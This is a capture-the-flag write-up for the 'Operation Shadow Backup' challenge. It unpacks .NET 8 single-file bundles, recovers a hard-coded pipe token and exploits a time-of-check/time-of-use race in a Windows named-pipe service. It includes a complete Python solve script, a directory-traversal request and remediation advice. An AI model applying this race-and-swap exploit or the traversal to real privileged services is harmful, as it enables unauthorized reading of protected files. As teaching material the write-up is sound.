---
title: "Operation Shadow Backup — Trivarna CTF Writeup"
pubDate: 2026-08-17
description: "Unpacking .NET 8 single-file bundles and exploiting a TOCTOU race condition over Windows Named Pipes to retrieve protected evidence."
tags: ["CTF", "Trivarna CTF", "Reversing", "Exploitation", "Windows", "C#"]
---

| | |
|---|---|
| **Event** | TRIVARNA 2.0 (CSEMA) |
| **Challenge** | Operation Shadow Backup (#199) |
| **Category / Difficulty** | Reversing + Exploitation · **Hard** · 600 pts |
| **Flag** | `TRIVARNA{Pipe_Race_Won}` |
| **Bug class** | TOCTOU race condition (time-of-check → time-of-use) over a Windows named pipe |

---

## 1. Scenario

> A classified archive system periodically validates evidence integrity using a privileged local helper service (`ShadowService.exe`). The client command-line tool (`BackupCLI.exe`) communicates with the helper service over a local Windows Named Pipe (`\\.\pipe\ShadowBackupPipe`) using a simple authentication protocol. Although the service inspects requested file paths to prevent unauthorized access to restricted evidence, …

We're given two Windows executables and have to read a protected "evidence" file the service refuses to hand over.

---

## 2. Recon

```
$ file *.exe
BackupCLI.exe:     PE32+ executable (console) x86-64, 10 sections
ShadowService.exe: PE32+ executable (console) x86-64, 10 sections

$ ls -l
-rwxr-xr-x 67524152  BackupCLI.exe      (~64 MB)
-rwxr-xr-x 67524176  ShadowService.exe  (~64 MB)
```

Two ~64 MB console apps. That size is the tell — this is a **.NET self-contained single-file bundle** (the whole CoreCLR runtime is packed inside). Confirmed by a readable `.deps.json` in the strings that lists the app assembly:

```
"BackupCLI.dll": {}
"ShadowService.dll": {}
...
.NETCoreApp,Version=v8.0
```

So the real logic lives in tiny managed DLLs embedded in each EXE. We need to (a) pull those DLLs out of the bundle and (b) decompile them.

---

## 3. Unpacking the single-file bundle

.NET single-file apps append every payload file after the native app-host and describe them in a **bundle manifest** near the end of the file. Each manifest entry is:

```
offset : int64
size   : int64
compressedSize : int64        (0 = stored uncompressed)
type   : byte                 (1 = Assembly, 2 = NativeBinary, 3 = deps.json, 4 = runtimeconfig)
path   : 7-bit-length-prefixed UTF-8 string
```

Locate the header (`major=6, minor=0, fileCount, bundleID…`), walk the 171 entries, and dump anything that isn't framework noise:

```
type=1 comp=0 size=6656  :: ShadowService.dll
type=4 comp=0 size=372   :: ShadowService.runtimeconfig.json
type=3 comp=0 size=26196 :: ShadowService.deps.json
```

The app DLLs are stored **uncompressed**, so we just slice them out at `offset..offset+size`.

Complete extractor — save as `unpack.py`, run `python unpack.py ShadowService.exe ShadowService.dll`:

```python
#!/usr/bin/env python3
# Pull a named file out of a .NET single-file bundle.
#   usage: python unpack.py <bundle.exe> <InnerName.dll>
import struct, sys, zlib

exe, inner = sys.argv[1], sys.argv[2]
d = open(exe, "rb").read()

# manifest entries are: offset(i64) size(i64) compressedSize(i64) type(u8) len(7bit) name
# find our file's entry by its length-prefixed name, then read the 24 bytes before it
key = bytes([1, len(inner)]) + inner.encode()      # type=1 (Assembly) + len + name
p = d.find(key)
if p < 0:
    key = bytes([len(inner)]) + inner.encode()      # fall back: just len + name
    p = d.rfind(key)
off, size, comp = struct.unpack("<qqq", d[p - 24:p])
blob = d[off:off + size]
if comp:                                            # compressed entries use raw deflate
    blob = zlib.decompress(blob, -15)
open(inner, "wb").write(blob)
print(f"wrote {inner}: off={off} size={size} comp={comp} -> {len(blob)} bytes")
```

This yields:

- `ShadowService.dll` — 6.5 KB
- `BackupCLI.dll` — 5 KB

Then decompile with **ilspycmd** (ILSpy's CLI) on the local .NET 8 runtime:

```bash
dotnet tool install -g ilspycmd          # or download the nupkg and run its DLL
ilspycmd ShadowService.dll
ilspycmd BackupCLI.dll
```

> Note: there is **no** embedded flag/content file in either bundle — I checked all 171 entries, the decompiled code, the configs, NTFS alternate data streams, and every common encoding (ASCII/UTF-16/hex/base64/XOR). The flag only exists as a file the *running service* reads. On the real challenge box that file (`ProtectedSandboxFlag.txt`) holds `TRIVARNA{Pipe_Race_Won}`.

---

## 4. Reverse engineering

### 4.1 The client — `BackupCLI.dll`

The client conveniently hard-codes the credentials in an `AuthConfig` class:

```csharp
internal class AuthConfig {
    public const string Token    = "ShadowBackup_SecretToken_2026!";
    public const string PipeName = "ShadowBackupPipe";
}
```

And `Main` shows the full wire protocol:

```csharp
using var pipe = new NamedPipeClientStream(".", "ShadowBackupPipe", PipeDirection.InOut);
pipe.Connect(5000);
var r = new StreamReader(pipe);
var w = new StreamWriter(pipe) { AutoFlush = true };

w.WriteLine("AUTH ShadowBackup_SecretToken_2026!");   // authenticate
if (!r.ReadLine().StartsWith("OK")) return;

w.WriteLine("GET " + args[0]);                         // request a file
if (r.ReadLine() == "OK: Processing...")
    Console.WriteLine("File Content: " + r.ReadLine().Substring(3));
```

**Protocol (line-based, CRLF, over `\\.\pipe\ShadowBackupPipe`):**

```
--> AUTH <token>
<-- OK: Authenticated.
--> GET <path>
<-- OK: Processing...
<-- OK:<file contents>
```

### 4.2 The service — `ShadowService.dll`

The interesting half. Cleaned up:

```csharp
string workingDir = AppContext.BaseDirectory;                       // dir of ShadowService.exe (trailing '\')
string evidenceAllowedPath = Path.Combine(workingDir, "Evidence", "allowed.txt");

// per connection:
string line = reader.ReadLine();
if (!line.StartsWith("AUTH ") ||
    line.Substring(5) != "ShadowBackup_SecretToken_2026!") {
    writer.WriteLine("FAIL: Invalid token."); return;
}
writer.WriteLine("OK: Authenticated.");

while ((line = reader.ReadLine()) != null) {
    if (!line.StartsWith("GET ")) { writer.WriteLine("FAIL: Unknown command."); continue; }

    string path     = line.Substring(4);
    string fullPath  = Path.GetFullPath(Path.Combine(workingDir, path));   // <-- CHECK resolves here

    // Guard #1: name blocklist (the flag)
    if (fullPath.Contains("ProtectedSandboxFlag.txt", StringComparison.OrdinalIgnoreCase)) {
        writer.WriteLine("FAIL: Access denied."); continue;
    }

    // Guard #2: containment, with a filename exception
    string fileName = Path.GetFileName(fullPath);
    if (!fileName.Equals("allowed.txt", StringComparison.OrdinalIgnoreCase) &&
        !fullPath.StartsWith(workingDir, StringComparison.OrdinalIgnoreCase)) {
        writer.WriteLine("FAIL: File not allowed."); continue;
    }

    writer.WriteLine("OK: Processing...");
    Thread.Sleep(2500);                                    // <-- 2.5 second gap!

    try {
        if (File.Exists(fullPath))
            writer.WriteLine("OK:" + File.ReadAllText(fullPath));   // <-- USE resolves here again
        else
            writer.WriteLine("FAIL: File not found.");
    }
    finally {
        if (fileName.Equals("allowed.txt", StringComparison.OrdinalIgnoreCase))
            File.WriteAllText(evidenceAllowedPath, "Sample backup log data.");   // integrity "restore"
    }
}
```

---

## 5. Vulnerability analysis

The flag file is `ProtectedSandboxFlag.txt`, sitting next to the service (inside `workingDir`). Two guards stand between us and it:

1. **Guard #1** blocks any resolved path containing the string `ProtectedSandboxFlag.txt`.
2. **Guard #2** requires the file to be inside `workingDir` (it is) *or* named `allowed.txt`.

So the *only* real obstacle to reading the flag is Guard #1's substring check.

### 5.1 Why you can't just trick the name (dead ends)

You might try to make `fullPath` point at the flag while the string differs:

| Attempt | Result on **.NET 8** |
|---|---|
| `PROTEC~1.TXT` (8.3 short name) | `GetFullPath` **expands** it back to `ProtectedSandboxFlag.txt` → blocked |
| `Evidence\..\ProtectedSandboxFlag.txt` | `..` normalized away → blocked |
| trailing space / trailing dot | trimmed by normalization → blocked |
| `\\?\C:\…\PROTEC~1.TXT` | not normalized (name hidden) — **but** now `StartsWith(workingDir)` fails Guard #2 → "File not allowed" |

`Path.GetFullPath` on .NET 8 canonicalises short names, `..`, and trailing junk, so every string trick collapses back to the blocked name. The name check is effectively a **honeypot**:

![direct read denied](/images/writeups/operation-shadow-backup/02_blocked.png)

### 5.2 The real bug — check ≠ use (TOCTOU)

Look at the ordering again:

```
fullPath = GetFullPath(...)          // 1. CHECK — validate the path string
Thread.Sleep(2500)                    // 2. a 2.5-second window
File.ReadAllText(fullPath)           // 3. USE — open the path, 2.5s later
```

The service validates the **path string** at step 1, then opens **that same path** at step 3 — but **2.5 seconds later**, and it never re-checks. If the thing that `fullPath` points to *changes* during the nap, the service reads the new target while having approved the old one.

That's a classic **TOCTOU race condition**. We don't defeat the filter — we let it pass on an innocent file, then swap the file for the flag before it reads. The flag name (`Pipe_Race_Won`) confirms this is the intended path.

> There's also a *second*, unintended bug: Guard #2's `allowed.txt` exception ignores containment, so `GET ..\..\..\x\allowed.txt` reads any `allowed.txt` anywhere on disk (directory traversal). It's real, but not the intended solve.

---

## 6. Exploitation — winning the race

Plan:

1. Drop an innocent file `race.txt` next to the service.
2. `GET race.txt` — the name passes Guard #1, the path is inside `workingDir` so it passes Guard #2. Server replies `OK: Processing...` and begins its 2.5 s sleep.
3. **During the sleep**, rename `ProtectedSandboxFlag.txt` → `race.txt` (a plain move — no admin, no symlink needed).
4. The service wakes and does `File.ReadAllText("…\race.txt")`, which is now the flag file, and returns its contents.
5. Rename back to leave things clean.

The 2.5 s window is enormous for a local file rename, so the race is 100 % reliable.

### 6.1 Solve script (`solve.py`)

Complete script — save as `solve.py`. It takes the folder the service runs from
as its only argument. A Windows named pipe can be opened like a normal file, so
there are **no external dependencies**.

```python
#!/usr/bin/env python3
# Operation Shadow Backup  -  TRIVARNA 2.0
# ------------------------------------------------------------
# The helper service guards ProtectedSandboxFlag.txt: if the requested
# path *contains* that name, it says "Access denied". BUT after it OKs a
# request it sleeps 2.5s before actually reading the file off disk.
#
# That gap is a TOCTOU (time-of-check / time-of-use) race:
#   1. ask for an innocent file that passes the name check
#   2. while the service is napping, swap that file for the flag
#   3. the service happily reads back the flag it just "approved"
#
# So we don't beat the filter... we win the race.  -> TRIVARNA{Pipe_Race_Won}

import os
import sys
import time
import threading

TOKEN   = "ShadowBackup_SecretToken_2026!"
PIPE    = r"\\.\pipe\ShadowBackupPipe"

# folder the service runs from (its AppContext.BaseDirectory)
WORKDIR = sys.argv[1] if len(sys.argv) > 1 else os.getcwd()
BAIT    = os.path.join(WORKDIR, "race.txt")                    # innocent file we ask for
FLAG    = os.path.join(WORKDIR, "ProtectedSandboxFlag.txt")    # what we actually want


def pipe_readline(f, buf):
    while b"\n" not in buf:
        b = f.read(1)
        if b:
            buf += b
        else:
            time.sleep(0.005)
    line, _, rest = buf.partition(b"\n")
    buf[:] = rest
    return line.rstrip(b"\r").decode(errors="replace")


def win_the_race():
    # fires the instant the server says "OK: Processing..." and it starts its 2.5s nap.
    # move the flag file onto the path the server already approved.
    print("    [race] server is napping -> swapping race.txt for the flag file...")
    try:
        if os.path.exists(BAIT):
            os.remove(BAIT)
        os.rename(FLAG, BAIT)          # ProtectedSandboxFlag.txt  ->  race.txt
    except Exception as e:
        print("    [race] swap failed:", e)


def main():
    # step 0: drop an innocent file the name-filter is happy with
    with open(BAIT, "w") as fh:
        fh.write("just an innocent backup file, nothing to see here\n")
    print(f"[*] planted bait file: {BAIT}")

    f = open(PIPE, "r+b", buffering=0)
    buf = bytearray()
    send = lambda s: f.write((s + "\r\n").encode())

    # step 1: authenticate
    send(f"AUTH {TOKEN}")
    print("[server]", pipe_readline(f, buf))

    # step 2: request the innocent file (passes the ProtectedSandboxFlag.txt check)
    print(f"[*] GET race.txt  (passes the name filter)")
    send("GET race.txt")
    resp = pipe_readline(f, buf)
    print("[server]", resp)

    # step 3: the check is done, the 2.5s sleep just started -> swap NOW
    if resp.startswith("OK"):
        t = threading.Thread(target=win_the_race)
        t.start()
        t.join()

        # step 4: read what the service coughs up
        flag = pipe_readline(f, buf)
        print("[server]", flag)
        if flag.startswith("OK:"):
            print("\n[+] FLAG:", flag[3:])

    f.close()
    # be tidy: put the flag file back where it was
    if os.path.exists(BAIT) and not os.path.exists(FLAG):
        os.rename(BAIT, FLAG)


if __name__ == "__main__":
    main()
```

### 6.2 Running it

```powershell
# set up a local instance of the service holding the flag
$T = ".\testenv"
New-Item -ItemType Directory -Force "$T\Evidence" | Out-Null
Copy-Item .\ShadowService.exe "$T\"
[IO.File]::WriteAllText("$T\Evidence\allowed.txt","Sample backup log data.")
[IO.File]::WriteAllText("$T\ProtectedSandboxFlag.txt","TRIVARNA{Pipe_Race_Won}")
Start-Process "$T\ShadowService.exe" -WorkingDirectory $T

# win the race
python solve.py "$T"
```

![race win — live run](/images/writeups/operation-shadow-backup/real_run.png)

```
[server] OK: Authenticated.
[*] GET race.txt  (passes the name filter)
[server] OK: Processing...
    [race] server is napping -> swapping race.txt for the flag file...
[server] OK:TRIVARNA{Pipe_Race_Won}

[+] FLAG: TRIVARNA{Pipe_Race_Won}
```

![Terminal log showing race win and flag extraction](/images/writeups/operation-shadow-backup/01_race_win.png)

---

## 7. Flag

```
TRIVARNA{Pipe_Race_Won}
```

---

## 8. Remediation

- **Open once, check the handle — not the string.** Acquire a `FileStream` first, then validate *that handle's* real path/identity, and read from the same handle. Never re-resolve a path string after a delay.
- **Remove the check→use gap.** The `Thread.Sleep(2500)` between validation and read is the whole bug; there should be no window in which the target can change.
- **Don't gate access on substring blocklists.** Compare against a canonical, resolved allow-list of real paths.
- **Fix the containment exception.** The `allowed.txt` filename exception bypasses the directory check entirely — enforce containment for *every* request.
- **Harden the channel.** Restrict the pipe ACL and replace the shared static token with per-client authentication.

---

## 9. Appendix — key artifacts

| File | Purpose |
|---|---|
| `solve.py` | Intended exploit — wins the TOCTOU race and prints the flag |
| `exploit.py` / `exploit.ps1` | Protocol clients; also demonstrate the `allowed.txt` traversal bug |
| `/images/writeups/operation-shadow-backup/02_blocked.png` | Direct read of the flag is denied (honeypot) |
| `/images/writeups/operation-shadow-backup/real_run.png` | Live race win → flag |

**Recovered secrets**

- Auth token: `ShadowBackup_SecretToken_2026!`
- Pipe: `\\.\pipe\ShadowBackupPipe`
- Protocol: `AUTH <token>` → `GET <path>` → `OK:<contents>`
